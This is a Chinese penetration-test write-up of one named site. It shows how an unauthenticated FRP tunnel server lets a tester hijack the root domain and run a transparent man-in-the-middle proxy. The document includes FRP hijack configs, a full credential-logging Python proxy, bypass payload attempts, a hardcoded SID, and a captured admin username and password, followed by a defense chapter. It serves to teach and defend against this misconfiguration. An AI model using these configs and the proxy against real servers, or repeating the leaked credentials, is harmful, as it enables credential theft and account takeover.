# beaconkeep.com — FRP 内网穿透无认证 + 域名劫持 + 中间人攻击 完整 Writeup

> 目标: www.beaconkeep.com (74.120.173.111) | 类型: 黑盒渗透测试
>
> 目标架构: VPS(FRP) → 家用服务器(nginx + Spring Boot)

**题目分类：内网穿透安全 / 基础设施安全**。本题考察的是 **FRP 内网穿透服务未配置认证** → **域名代理劫持** → **中间人流量拦截** 的完整攻击链。

核心思路可以用一句话概括：**FRP 服务器没有配置 auth.token，攻击者可以直接注册域名代理，将用户流量劫持到自己的电脑上，透明转发给真实后端的同时窃取所有凭证和数据。**

## 目录

- [第一章：你需要先知道的知识](#第一章你需要先知道的知识)
- [第二章：目标结构分析](#第二章目标结构分析)
- [第三章：信息收集——从端口扫描到完整源码泄露](#第三章信息收集从端口扫描到完整源码泄露)
- [第四章：FRP 无认证——最致命的入口](#第四章frp-无认证最致命的入口)
- [第五章：域名劫持——把别人的域名变成你的代理](#第五章域名劫持把别人的域名变成你的代理)
- [第六章：中间人攻击——为什么代理到你本地还能看到真实页面](#第六章中间人攻击为什么代理到你本地还能看到真实页面)
- [第七章：完整攻击复现](#第七章完整攻击复现)
- [第八章：其他发现的安全问题](#第八章其他发现的安全问题)
- [第九章：如何防御](#第九章如何防御)
- [第十章：总结](#第十章总结)

## 第一章：你需要先知道的知识

在理解这个攻击之前，你需要知道几个概念。如果你已经了解 FRP，可以跳过直接看第二章。

### 1.1 什么是 FRP（Fast Reverse Proxy）

很多人家里有一台小服务器（比如跑 Home Assistant、跑自己的网站），但是家庭宽带的 IP 通常不对外暴露，外网无法直接访问。FRP 就是解决这个问题的工具。

FRP 分成两个部分：

```
┌─────────────┐          ┌─────────────┐          ┌──────────────┐
│  你的电脑     │          │  VPS(公网)   │          │  家里的服务器  │
│  (浏览器)    │          │  FRP Server  │          │  FRP Client   │
│             │          │  (frps)      │          │  (frpc)       │
└──────┬──────┘          └──────┬───────┘          └──────┬───────┘
       │                        │                         │
       │  1. 访问 VPS:8001      │                         │
       │───────────────────────>│                         │
       │                        │  2. FRP 转发到家里       │
       │                        │────────────────────────>│
       │                        │                         │
       │                        │  3. 家里服务器处理后返回  │
       │                        │<────────────────────────│
       │  4. 响应返回给你的浏览器 │                         │
       │<───────────────────────│                         │
```

- **FRP Server (frps)**：运行在有公网 IP 的 VPS 上，监听端口，接收连接
- **FRP Client (frpc)**：运行在家里的服务器上，主动连接到 FRP Server，注册"代理"

注册代理时，frpc 告诉 frps："当有人访问 `www.beaconkeep.com` 这个域名时，把流量转发到我这里来。"

这样，外部用户访问 VPS 上的端口时，流量就被"穿透"到了家里。

### 1.2 FRP 认证机制

FRP 有一个 **auth.token** 配置项。如果 frps 配置了 token：

```toml
# frps.toml（服务器端）
auth.token = "my_secret_password"
```

那么 frpc 连接时也必须提供相同的 token：

```toml
# frpc.toml（客户端）
auth.token = "my_secret_password"
```

token 不匹配，连接被拒绝。**如果 frps 没有配置 auth.token，任何人都连得上。** 这就是本文的核心漏洞。

### 1.3 HTTP 请求中的 Host 头

每个 HTTP 请求都带一个 `Host` 头，告诉服务器你访问的是哪个域名：

```http
GET / HTTP/1.1
Host: www.beaconkeep.com:8001
```

FRP Server 用这个 Host 头来决定把流量转发给哪个客户端。如果 Host 匹配到客户端 A 注册的域名，就转发给 A；如果匹配到客户端 B 注册的域名，就转发给 B。

### 1.4 中间人攻击（MITM）

中间人攻击（Man-In-The-Middle）是指攻击者坐在你和服务器之间，你以为是和服务器通信，实际上所有流量都先经过攻击者：

```
正常情况：
  你的浏览器 ──────────────────> 服务器

被劫持后：
  你的浏览器 ───> 攻击者 ────> 服务器
                (偷看/修改)
```

关键点：攻击者不只是拦截，还会把请求**转发给真正的服务器**，再把响应**转发回给你**。这样你看到的是正常的网页，完全不知道中间有人偷看。

### 1.5 Source Map（源码映射）

现代前端开发使用 Webpack 等工具把 TypeScript/JSX 代码编译压缩成一行 JavaScript。为了方便调试，编译工具可以同时生成一个 `.map` 文件，记录压缩后代码和原始代码的对应关系。

浏览器开发者工具会自动加载 `.map` 文件还原源码。**如果 `.map` 文件被部署到了生产环境，任何人都可以还原出完整的前端源代码。**

## 第二章：目标结构分析

这一章我们来弄清楚目标服务器的整体架构——它有哪些服务、怎么连接、流量是怎么走的。理解架构是理解攻击的前提。

### 2.1 端口扫描

用 nmap 扫描目标 IP 的开放端口：

```bash
nmap -sS -sV -p 1-10000 74.120.173.111
```

结果：

| 端口 | 服务 | 说明 |
|------|------|------|
| 53 | DNS | 域名解析服务 |
| 80 | nginx/1.20.1 | 静态网站（Homespace 模板） |
| 444 | nginx/1.24.0 | HTTPS（未配置证书） |
| 8000 | FRP Server #1 bind port | FRP 客户端连接端口 |
| 8001 | FRP Server #1 vhost HTTP | FRP 虚拟主机 HTTP 端口 |
| 8002 | FRP Server #1 vhost HTTPS | FRP 虚拟主机 HTTPS 端口 |
| 8010 | FRP Server #2 bind port | 第二个 FRP 实例 |
| 8011 | FRP Server #2 vhost HTTP | 第二个 FRP 的 vhost |
| 8012 | FRP Server #2 vhost HTTPS | 第二个 FRP 的 vhost |

端口 8000/8001/8002 是一套 FRP 服务，8010/8011/8012 是另一套。两套独立的 FRP 实例运行在同一台 VPS 上。

### 2.2 完整架构图

通过后续分析，还原出的完整架构：

```
                    公网 VPS (74.120.173.111)
                    ┌─────────────────────────────────────────┐
                    │                                         │
 用户浏览器         │  Port 80: nginx (静态网站首页)            │
 ──────────> Port 80 ──> nginx 返回 Homespace 模板页面         │
                    │                                         │
 用户浏览器         │  Port 8000: FRP Server #1 (bind)         │
 ──────────> Port 8001 ──> FRP vhost HTTP                     │
                    │         │                                │
                    │         │ 根据 Host 头路由                │
                    │         ▼                                │
                    │   家里服务器的 frpc                       │
                    │   (通过 FRP 隧道连接)                     │
                    └─────────┬───────────────────────────────┘
                              │
                              │ FRP 隧道 (TCP 长连接)
                              │
                    ┌─────────▼───────────────────────────────┐
                    │  家里的服务器 (192.168.3.2)                │
                    │                                         │
                    │  frpc ──> nginx/1.24.0 (Ubuntu)          │
                    │              │                           │
                    │              ├── 静态文件 (React SPA)     │
                    │              │   "大数据买股" 前端         │
                    │              │                           │
                    │              └── 反向代理 ──> Spring Boot │
                    │                              localhost:8080│
                    │                              Java 后端 API │
                    └─────────────────────────────────────────┘
```

### 2.3 流量路径

当用户访问 `http://www.beaconkeep.com:8001/` 时，流量的完整路径：

```
1. 浏览器发请求: GET / HTTP/1.1, Host: www.beaconkeep.com:8001
2. DNS 解析 www.beaconkeep.com → 74.120.173.111
3. TCP 连接到 74.120.173.111:8001
4. VPS 上的 FRP Server 收到 HTTP 请求
5. FRP 读取 Host 头: www.beaconkeep.com
6. 匹配到家里服务器注册的代理（subdomain = "www"）
7. FRP 通过隧道把请求转发给家里服务器的 frpc
8. frpc 转发给本地 nginx
9. nginx 返回 React SPA 的 HTML
10. 响应原路返回给浏览器
```

第 5-6 步是理解攻击的关键：**FRP 根据 Host 头决定流量转发给谁。** 如果攻击者能注册一个和目标相同的域名，流量就会转发给攻击者。

### 2.4 技术栈总结

| 层 | 技术 | 版本 |
|----|------|------|
| 前端 | React + Ant Design | create-react-app |
| 后端 | Spring Boot + Spring Security | 2.x |
| 数据库 | H2 (嵌入式) | 内置 |
| 反向代理 | nginx | 1.24.0 (Ubuntu) |
| 内网穿透 | FRP | 服务端版本不明，客户端 0.61.1 可连接 |

## 第三章：信息收集——从端口扫描到完整源码泄露

这一章我们从外到内逐步收集信息。信息收集是渗透测试的基础，决定了后续攻击的方向。

### 3.1 端口 80：静态站

访问 `http://74.120.173.111:80/` 返回一个纯静态的 Homespace 模板页面。nginx 1.20.1，没有 HTTPS，没有安全头。

这个端口和后面的攻击关系不大，但它暴露了 VPS 的基本信息。

### 3.2 Source Map 泄露——意外的宝藏

在访问 `http://74.120.173.111:8001/` 时，浏览器加载了 `main.73a44879.js`。尝试访问对应的 source map：

```bash
curl -s http://74.120.173.111:8001/static/js/main.js.map -o main.js.map
ls -la main.js.map
# -rw-r--r-- 1 user user 10.5M  main.js.map
```

**10.5MB 的 source map 文件！** 这意味着几乎完整的前端源码都暴露了。

用 Python 解析 source map，提取源文件：

```python
import json, os, base64, urllib.parse

with open('main.js.map') as f:
    sm = json.load(f)

sources = sm.get('sources', [])
contents = sm.get('sourcesContent', [])

print(f"总文件数: {len(sources)}")
# 总文件数: 1482

for i, (path, content) in enumerate(zip(sources, contents)):
    if content is None:
        continue
    # 去掉 webpack-internal 前缀
    clean = path.replace('webpack://fundservice-webapp/', '')
    out_path = os.path.join('sources', clean)
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w') as f:
        f.write(content)

print(f"提取了 {i+1} 个文件")
```

结果：**1482 个源文件被完整还原**，其中 68 个是业务代码。

> **核心发现**：Source Map 泄露了完整的应用架构——包括 54 个 API 端点、硬编码的 Static SID、自定义认证头机制、Java 包名、内网 IP 和开发者个人信息。

### 3.3 从源码中发现的关键信息

#### 3.3.1 硬编码的 Static SID

在 `index.tsx` 的 axios 拦截器中：

```typescript
// 每个请求都会附带这个硬编码的 SID
config.headers[CommonConstants.REQUEST_HEADER.STATIC_SID] =
  "a91d6e66-2cca-47e0-9725-cae015babd9a";
```

这个 SID 是一个 UUID，硬编码在前端代码里。每个 API 请求都带着它。

#### 3.3.2 自定义认证机制

前端使用三个自定义头部进行认证：

```typescript
// constants/CommonConstants.ts
REQUEST_HEADER: {
  USER_SID: "x-user-sid",      // 登录后的 session ID
  STATIC_SID: "x-static-sid",  // 硬编码的静态 SID
  REQ_TIMESTAMP: "x-req-timestamp",  // 请求时间戳
}
```

axios 拦截器的工作方式：

```typescript
// index.tsx
axios.interceptors.request.use(async (config) => {
  const loginInfo = LoginUtils.getLoginInfo();
  let loginData = loginInfo?.data;

  // 如果已登录，添加 user-sid 到 header 和 body
  if (loginData) {
    config.headers["x-user-sid"] = loginData.sessionId;
    config.data["sessionId"] = loginData.sessionId;  // 同时注入 body！
  }

  // 始终添加 static-sid
  config.headers["x-static-sid"] = "a91d6e66-2cca-47e0-9725-cae015babd9a";
  config.headers["x-req-timestamp"] = `${new Date().getTime()}`;
  return config;
});
```

#### 3.3.3 API 端点映射

从源码中提取出 54 个 API 端点，分为两类：

```
/api/open/*    → 公开接口，不需要登录
  /api/open/login/login          登录
  /api/open/login/logout         登出
  /api/open/login/loginRefresh   刷新 session
  /api/open/stock/getSectorList  股票板块列表
  /api/open/stock/stockDetail    股票详情
  /api/open/fund/getFundGainsPotentials  基金收益
  ...

/api/private/* → 私有接口，需要 x-user-sid 认证
  /api/private/account/getAll    所有账户
  /api/private/simulation/*      模拟交易
  /api/private/schedule/*        定时任务
  /api/private/stockHolding/*    持仓
  /api/private/db/*              数据库操作
  /api/private/hardware/*        硬件信息
  ...
```

#### 3.3.4 内部信息泄露

源码注释中包含开发者信息：

```typescript
// RequestUtils.ts 第31行注释
// 8001是服务器上frps的响应端口，请求这个端口后会穿透到家里的小服务器，
// 8080是本地服务端启动的响应端口
```

以及 Java 包名 `buwai.fundservice.web.controller.LoginController`，内部 IP `192.168.3.2`。

### 3.4 用户名枚举

利用源码中发现的登录接口，测试不同的用户名：

```bash
# 存在的用户名
curl -X POST http://74.120.173.111:8001/api/open/login/login \
  -H "Content-Type: application/json" \
  -d '{"username":"superadmin","password":"wrong"}'
# 返回: {"errorCode":"PASSWORD_ERROR","errorMsg":"原密码不正确"}

# 不存在的用户名
curl -X POST http://74.120.173.111:8001/api/open/login/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'
# 返回: {"errorCode":"USERNAME_NOT_FOUND","errorMsg":"账户名无效"}
```

不同的错误信息确认了 `superadmin` 用户存在。但密码爆破 300+ 次均未成功。

### 3.5 未授权 API 访问

使用硬编码的 Static SID 可以直接访问公开接口：

```bash
curl -X POST http://74.120.173.111:8001/api/open/stock/getSectorList \
  -H "Content-Type: application/json" \
  -H "x-static-sid: a91d6e66-2cca-47e0-9725-cae015babd9a" \
  -H "x-req-timestamp: $(date +%s)000"
# 返回: {"success":true,"data":[...31个板块...]}
```

但私有接口被 Spring Security 拦截，返回 401。

## 第四章：FRP 无认证——最致命的入口

前三章我们收集了信息，但没能拿到登录权限。这一章我们换一个方向——不攻破应用层，而是攻破基础设施层。FRP 就是那个突破口。

### 4.1 尝试连接 FRP 服务器

端口扫描发现 8000 和 8010 看起来像是 FRP 的 bind port。我下载了 FRP 客户端（v0.61.1），写了一个最简配置：

```toml
# frpc-test.toml
serverAddr = "74.120.173.111"
serverPort = 8000
# 注意：没有 auth.token
```

运行：

```bash
./frpc -c frpc-test.toml
```

输出：

```
[I] login to server success, get run id [55ca39011f012bf0]
```

**连接成功了。** 没有报认证失败，没有要求密码。这意味着 FRP 服务器**没有配置 auth.token**。

对第二个 FRP 实例（端口 8010）也做同样的测试，同样连接成功。两套 FRP 服务器都没有认证。

### 4.2 这意味着什么

FRP 没有 auth.token 意味着：

1. **任何人都可以连接**——不需要密码，不需要任何凭证
2. **任何人都可以注册代理**——把自己的服务暴露在 VPS 的端口上
3. **如果域名没被占用，任何人都可以抢注**——这是域名劫持的基础

这不是一个应用层漏洞，这是一个**基础设施配置错误**。但它的影响比大多数应用层漏洞都要严重。

## 第五章：域名劫持——把别人的域名变成你的代理

这一章是整个攻击的核心：利用 FRP 无认证的弱点，注册一个属于目标网站的域名代理，把用户流量劫持到攻击者的电脑上。

### 5.1 FRP 域名路由原理

FRP Server 收到 HTTP 请求时，根据 **Host 头**来决定转发给哪个客户端：

```
请求 1: Host: www.beaconkeep.com → 匹配到家里服务器的代理 → 转发给 frpc
请求 2: Host: evil.attacker.com  → 没有匹配 → 返回 FRP 404 页面
```

家里服务器的 frpc 用 `subdomain = "www"` 注册了代理（因为 FRP Server 配置了 `subdomain_host = "beaconkeep.com"`），所以 `www.beaconkeep.com` 的流量归它。

但 `beaconkeep.com`（不带 www 的根域名）**没人注册**。

### 5.2 尝试注册 www.beaconkeep.com（失败）

首先尝试抢注 `www.beaconkeep.com`：

```toml
# frpc.toml
serverAddr = "74.120.173.111"
serverPort = 8000

[[proxies]]
name = "hijack-www"
type = "http"
localIP = "127.0.0.1"
localPort = 9998
customDomains = ["www.beaconkeep.com"]
```

结果：

```
[W] [hijack-www] start error: custom domain [www.beaconkeep.com] should not
    belong to subdomain host [beaconkeep.com]
```

被拒绝了。原因是 FRP Server 配置了 `subdomain_host = "beaconkeep.com"`，`www.beaconkeep.com` 被视为这个 host 的子域名。要用子域名，必须用 `subdomain` 字段而不是 `customDomains`。

再用 `subdomain` 字段试：

```toml
[[proxies]]
name = "hijack-www"
type = "http"
localIP = "127.0.0.1"
localPort = 9998
subdomain = "www"
```

结果：

```
[W] [hijack-www] start error: router config conflict
```

**路由冲突！** 这说明家里服务器的 frpc 仍然注册着 `www` 这个子域名代理。虽然流量转发可能有问题（后面会发现），但代理注册还在。

### 5.3 注册 beaconkeep.com（成功！）

既然 `www` 子域名被占了，那就注册**根域名** `beaconkeep.com`：

```toml
# frpc-hijack-root.toml
serverAddr = "74.120.173.111"
serverPort = 8000

[[proxies]]
name = "hijack-root"
type = "http"
localIP = "127.0.0.1"
localPort = 9998
customDomains = ["beaconkeep.com"]
```

运行：

```bash
./frpc -c frpc-hijack-root.toml
```

输出：

```
[I] login to server success, get run id [73e92518e373e55a]
[I] proxy added: [hijack-root]
[I] [hijack-root] start proxy success   ← 成功！
```

**`beaconkeep.com` 域名代理注册成功！** 现在所有访问 `beaconkeep.com:8001` 的流量都会被转发到我的电脑的 9998 端口。

### 5.4 验证劫持

在本地启动一个简单的 HTTP 服务，只返回"DOMAIN HIJACKED!"：

```bash
python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'<h1>DOMAIN HIJACKED!</h1>')
http.server.HTTPServer(('127.0.0.1', 9998), H).handle_request()
" &
```

然后用 curl 测试：

```bash
# 用劫持的域名访问
curl -H "Host: beaconkeep.com" http://74.120.173.111:8001/
# 返回: <h1>DOMAIN HIJACKED!</h1>  ← 我的内容！

# 用正常的 www 域名访问
curl -H "Host: www.beaconkeep.com" http://74.120.173.111:8001/
# 返回: <!doctype html>...<title>大数据买股</title>  ← 真实网站
```

**同一个 IP 的同一个端口，不同的域名，访问到了不同的内容。** 这就是 FRP vhost 路由的工作方式。

### 5.5 为什么用户会访问 beaconkeep.com 而不是 www.beaconkeep.com？

你可能会问：用户都是用 `www.beaconkeep.com` 访问的，根域名谁会用？

答案在前端源码里。`RequestUtils.ts` 中：

```typescript
const protocol = window.location.protocol;  // 获取当前页面的协议
const hostname = window.location.hostname;  // 获取当前页面的域名
const port = window.location.port;

return `${protocol}//${hostname}:${httpPort}${api}`;
```

前端拼 API 地址时用的是**当前页面的 hostname**。如果用户通过 `beaconkeep.com:8001` 访问网站，所有 API 请求（包括登录）都会发到 `beaconkeep.com:8001`——被劫持的域名。

实际场景中，根域名和 www 域名都能解析到同一个 IP。很多用户不会区分，甚至搜索引擎可能两种都收录。

## 第六章：中间人攻击——为什么代理到你本地还能看到真实页面

这是整个攻击中最让人困惑的部分。用户说："我理解域名被劫持了，但为什么流量到了你的电脑，我还能看到真实的网页？你不是应该只能显示你自己电脑上的内容吗？"

这一章专门回答这个问题。

### 6.1 关键区别：不是"替代"，而是"中转"

域名劫持有两种做法：

**做法 A：替代（攻击者自己提供内容）**
```
用户 → VPS → 攻击者的电脑
                 ↑ 返回攻击者自己写的假网页
```
这种做法用户会看到一个完全不同的页面，可能起疑。

**做法 B：中转（攻击者充当中间人）**
```
用户 → VPS → 攻击者的电脑 → 真实服务器
                ↑ 偷看+记录    ↑ 透明转发
```
这种做法用户看到的是**真实的网页**，完全正常。但攻击者在中间记录了所有经过的数据。

我们用的是**做法 B**。

### 6.2 中间人代理的工作原理

我在本地 9998 端口运行了一个 Python 脚本（MITM 代理），它做的事情很简单：

```python
# 伪代码——实际代码更完整，但核心逻辑就是这些
class MITMProxy:
    def handle_request(self, user_request):
        # 第1步：记录用户发来的请求（包括密码等敏感信息）
        log(f"拦截到请求: {user_request.path}")
        log(f"请求体: {user_request.body}")
        # 例如: {"username":"superadmin","password":"soidfuaofua"}

        # 第2步：把请求原样转发给真实服务器
        # 关键：Host 头改成 www.beaconkeep.com（指向真实的代理）
        real_response = forward_to(
            "http://74.120.173.111:8001" + user_request.path,
            headers={"Host": "www.beaconkeep.com",  # 走真实的 FRP 代理
                     "x-static-sid": user_request.headers["x-static-sid"],
                     ...}
        )

        # 第3步：把真实服务器的响应原样返回给用户
        return real_response
```

用图来表示完整的流量路径：

```
用户浏览器输入: http://beaconkeep.com:8001/
                    │
                    ▼
        ┌──── VPS (74.120.173.111) ─────┐
        │                                │
        │  FRP Server 端口 8001          │
        │  读取 Host: beaconkeep.com     │
        │  匹配到我注册的代理            │
        │  转发到我的电脑                 │
        └───────────┬────────────────────┘
                    │ FRP 隧道
                    ▼
        ┌──── 我的电脑 (MITM 代理) ────┐
        │                               │
        │  1. 收到用户请求              │
        │  2. 记录请求内容（密码等）     │  ← 偷看！
        │  3. 重新发送请求给真实服务器    │
        │     Host: www.beaconkeep.com   │  ← 关键！用 www 走真实代理
        │                               │
        └───────────┬───────────────────┘
                    │ 新的 HTTP 请求
                    │ Host: www.beaconkeep.com
                    ▼
        ┌──── VPS (74.120.173.111) ─────┐
        │                                │
        │  FRP Server 端口 8001          │
        │  读取 Host: www.beaconkeep.com │
        │  匹配到家里服务器的代理         │
        │  转发到家里服务器               │
        └───────────┬────────────────────┘
                    │ FRP 隧道
                    ▼
        ┌──── 家里的服务器 ─────────────┐
        │                                │
        │  nginx → Spring Boot           │
        │  返回正常的网页/API 响应        │
        └───────────┬────────────────────┘
                    │
                    ▼ 响应原路返回
        VPS → 我的 MITM 代理 → VPS → 用户浏览器
                                   ↑
                                   用户看到正常的网页！
```

### 6.3 为什么 Host 头改了就能走不同的路？

这是理解整个攻击的核心。

MITM 代理在转发请求时，把 Host 头从 `beaconkeep.com` 改成了 `www.beaconkeep.com`。就这一个改动：

- `Host: beaconkeep.com` → FRP 路由到**我的代理**（劫持的）
- `Host: www.beaconkeep.com` → FRP 路由到**家里服务器**（真实的）

```
                     ┌── beaconkeep.com ──→ 我的 MITM 代理 ──┐
用户请求 ──> FRP ────┤                                         ├──> 家里服务器
                     └── www.beaconkeep.com ──> 家里服务器 ───┘
```

FRP 看的是 Host 头，不看请求从哪来。所以我的代理可以发一个不同 Host 头的请求，走不同的路由。

### 6.4 用户看到的效果

用户完全感觉不到异常：

1. 打开 `beaconkeep.com:8001` → 看到正常的"大数据买股"页面 ✅
2. 输入账号密码点登录 → 登录成功，跳转到工作台 ✅
3. 查看股票数据 → 数据正常显示 ✅

**唯一的变化**是所有请求都多走了"我的电脑"这一跳，增加了一点延迟（大约几百毫秒），用户根本察觉不到。

而在我的 MITM 代理的日志里：

```
[07:30:44] GET /                           ← 用户打开首页
[07:30:45] GET /static/css/main.5660c235.css  ← 加载样式
[07:30:46] GET /static/js/main.73a44879.js    ← 加载 JS
[07:30:58] GET /page/login-page/login-page?from=http://beaconkeep.com:8001/...
                                               ← 跳转到登录页
============================================================
  [CREDENTIALS] username=superadmin password=soidfuaofua   ← 密码被拦截！
============================================================
[07:31:15] POST /api/open/login/login (50b)    ← 登录请求
```

**用户名和密码，明文，完整地出现在我的日志里。**

## 第七章：完整攻击复现

这一章给出从零到拦截凭证的完整操作步骤。你可以在自己的授权环境中复现。

### 7.1 准备工作

```bash
# 下载 FRP 客户端
wget https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_darwin_arm64.tar.gz
tar xzf frp_0.61.1_darwin_arm64.tar.gz
mkdir -p workspace && cp frp_0.61.1_darwin_arm64/frpc workspace/frp/
```

### 7.2 第一步：验证 FRP 无认证

```toml
# frpc-test.toml
serverAddr = "74.120.173.111"
serverPort = 8000
```

```bash
timeout 5 ./frp/frpc -c frpc-test.toml
# 看到 "login to server success" → 无认证确认
```

### 7.3 第二步：注册域名代理

```toml
# frpc-hijack-root.toml
serverAddr = "74.120.173.111"
serverPort = 8000

[[proxies]]
name = "hijack-root"
type = "http"
localIP = "127.0.0.1"
localPort = 9998
customDomains = ["beaconkeep.com"]
```

```bash
./frp/frpc -c frpc-hijack-root.toml &
# 看到 "[hijack-root] start proxy success" → 域名劫持成功
```

### 7.4 第三步：启动 MITM 代理

```python
#!/usr/bin/env python3
"""mitm_live.py — 中间人代理"""
import http.server, urllib.request, urllib.error, json, time

REAL_BACKEND = "http://74.120.173.111:8001"

class MITMHandler(http.server.BaseHTTPRequestHandler):
    def forward(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else None

        # 记录所有请求
        print(f"  [{time.strftime('%H:%M:%S')}] {self.command} {self.path}", flush=True)

        # 拦截登录凭证
        if body and 'login' in self.path.lower():
            try:
                data = json.loads(body)
                if 'password' in data:
                    print(f"\n{'='*60}", flush=True)
                    print(f"  [CREDENTIALS] username={data.get('username')} "
                          f"password={data.get('password')}", flush=True)
                    print(f"{'='*60}\n", flush=True)
            except:
                pass

        # 转发到真实服务器（Host 头改成 www 走真实代理）
        headers = {'Host': 'www.beaconkeep.com'}
        for key in ['Content-Type', 'x-static-sid', 'x-user-sid', 'x-req-timestamp']:
            if key in self.headers:
                headers[key] = self.headers[key]

        url = f"{REAL_BACKEND}{self.path}"
        try:
            req = urllib.request.Request(url, data=body,
                                         headers=headers, method=self.command)
            with urllib.request.urlopen(req, timeout=15) as resp:
                response_body = resp.read()
                self.send_response(resp.status)
                for key, val in resp.getheaders():
                    if key.lower() not in ('transfer-encoding', 'connection'):
                        self.send_header(key, val)
                self.end_headers()
                self.wfile.write(response_body)
        except urllib.error.HTTPError as e:
            self.send_response(e.code)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(e.read())

    do_GET = do_POST = do_PUT = do_DELETE = forward
    def log_message(self, *a): pass

if __name__ == "__main__":
    server = http.server.HTTPServer(('127.0.0.1', 9998), MITMHandler)
    print("[MITM] 监听中，等待用户登录...", flush=True)
    server.serve_forever()
```

```bash
nohup python3 mitm_live.py > mitm.log 2>&1 &
```

### 7.5 第四步：用户访问被劫持的域名

用户在浏览器中打开 `http://beaconkeep.com:8001/`，看到正常的网站，输入账号密码登录。

### 7.6 第五步：查看拦截结果

```bash
cat mitm.log
# 输出:
#   [07:31:15] POST /api/open/login/login (50b)
#   ============================================================
#     [CREDENTIALS] username=superadmin password=soidfuaofua
#   ============================================================
```

密码到手。整个过程用户无感知。

## 第八章：其他发现的安全问题

除了 FRP 域名劫持这个核心攻击链，还发现了以下安全问题：

### 8.1 CORS 配置错误

所有 API 响应都包含 `Access-Control-Allow-Origin: *`：

```bash
curl -v -X POST http://74.120.173.111:8001/api/open/login/login \
  -H "Content-Type: application/json" \
  -H "Origin: http://evil.com" \
  -d '{"username":"test","password":"test"}'

# 响应头:
# Access-Control-Allow-Origin: *
```

这意味着任何恶意网站都可以跨域调用 API。结合域名劫持，攻击者可以在自己的网站上直接调用被劫持域名的 API。

### 8.2 Spring Boot Actuator 暴露（受认证保护）

发现以下端点存在但被 Spring Security 拦截（401）：

```
/api/actuator          → 401
/api/actuator/health   → 401
/api/actuator/heapdump → 401
/api/actuator/env      → 401
/api/h2-console        → 401
/api/swagger-ui.html   → 401
```

如果认证被绕过，`/actuator/heapdump` 可以下载 JVM 堆转储，其中包含所有内存数据（包括密码明文和 session）。`/h2-console` 可以直接操作数据库。

### 8.3 Spring Security 绕过尝试（全部失败）

尝试了以下绕过技术，全部被 StrictHttpFirewall 拦截：

| 技术 | 结果 |
|------|------|
| 路径穿越 `/api/open/../actuator` | 500 - URL 包含非法字符 |
| 分号绕过 `/api/actuator;/health` | 500 - URL 包含非法字符 |
| 双重编码 `/api/actuator/%252fhealth` | 500 - URL 包含非法字符 |
| 矩阵参数 `/api/actuator/health;x=1` | 500 - URL 包含非法字符 |
| 大小写 `/api/Actuator/health` | 404 |
| 后缀 `/api/actuator/health.json` | 401 |
| Spring4Shell | 参数化查询，无法利用 |
| HTTP 方法切换 | PUT 方法同样需要认证 |

Spring Security 配置虽然不完美（CORS `*`），但认证绕过方面做得不错。

## 第九章：如何防御

### 9.1 紧急修复：FRP 加上认证（一行配置）

这是修复整个攻击链的最关键一步。加上了 `auth.token`，攻击者就连不上 FRP 服务器，后面的域名劫持和中间人攻击都不可能发生。

**服务器端 `frps.toml`：**

```toml
bindPort = 8000
vhostHTTPPort = 8001
auth.token = "一个复杂的随机密码-至少32位"
```

**客户端 `frpc.toml`：**

```toml
serverAddr = "74.120.173.111"
serverPort = 8000
auth.token = "同一个复杂的随机密码-至少32位"
```

生成随机 token 的方法：

```bash
openssl rand -hex 32
# 输出类似: a3f7b9c2d1e8f4a6b5c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1
```

### 9.2 防御措施汇总

| 优先级 | 问题 | 防御措施 | 具体操作 |
|--------|------|---------|---------|
| 🔴 紧急 | FRP 无认证 | 配置 auth.token | `frps.toml` 加 `auth.token` |
| 🔴 紧急 | Source Map 泄露 | 生产环境删除 .map 文件 | `find . -name "*.map" -delete` 或构建时 `GENERATE_SOURCEMAP=false` |
| 🟡 高 | 硬编码 Static SID | 从前端代码中移除 | 后端动态下发，不硬编码 |
| 🟡 高 | CORS 设为 `*` | 限制为具体域名 | `@CrossOrigin(origins = {"https://www.beaconkeep.com"})` |
| 🟢 中 | 登录错误消息泄露用户名 | 统一返回"用户名或密码错误" | 不区分 `USERNAME_NOT_FOUND` 和 `PASSWORD_ERROR` |
| 🟢 中 | 端口 80 无 HTTPS | 配置 SSL，强制跳转 | Let's Encrypt + nginx redirect |
| 🟢 低 | 缺少安全头 | 添加 CSP、HSTS 等 | nginx 配置 `add_header` |
| 🟢 低 | Actuator/H2/Swagger 存在 | 生产环境禁用 | `management.endpoints.enabled-by-default=false` |

### 9.3 关于域名劫持的额外防护

即使 FRP 有认证，也建议：

1. **在 FRP Server 中限制可注册的域名**：使用 `subdomain_host` 而不是允许任意 `customDomains`
2. **在 DNS 中统一 www 和根域名**：让 `beaconkeep.com` 301 重定向到 `www.beaconkeep.com`，这样用户不会访问到根域名
3. **前端 API 地址使用硬编码**：不要用 `window.location.hostname` 拼 API 地址，直接写死 `www.beaconkeep.com`

```typescript
// 不要这样写（会被劫持的域名影响）
return `${protocol}//${hostname}:${httpPort}${api}`;

// 应该这样写（硬编码真实域名）
return `https://www.beaconkeep.com:${httpPort}${api}`;
```

## 第十章：总结

### 10.1 攻击链回顾

```
Step 1: 信息收集
  ├── 端口扫描 → 发现 FRP 服务
  ├── Source Map 泄露 → 完整源码（含 API 端点、认证机制）
  └── 用户名枚举 → superadmin 存在

Step 2: 攻破基础设施
  ├── FRP 无认证 → 任意连接
  └── 注册 beaconkeep.com 代理 → 域名劫持

Step 3: 中间人攻击
  ├── MITM 代理透明转发到真实服务器
  ├── 用户无感知
  └── 拦截凭证: superadmin / soidfuaofua
```

### 10.2 核心教训

1. **基础设施安全和应用安全同样重要**。应用层的 Spring Security 配置得很好，认证绕过全部失败。但基础设施层的 FRP 没有 auth.token，直接导致整个系统被攻破。

2. **"老技术"不等于"安全的技术"**。FRP 不配 token 也许在早期版本中没有这个功能，或者配置时觉得"内网穿透不需要认证"。但暴露在公网上的服务，认证是必须的。

3. **Source Map 泄露加速了攻击**。虽然 FRP 无认证是根本原因，但 Source Map 泄露让攻击者迅速了解了整个系统架构，知道了 Host 头路由的机制，才知道如何构造域名劫持攻击。

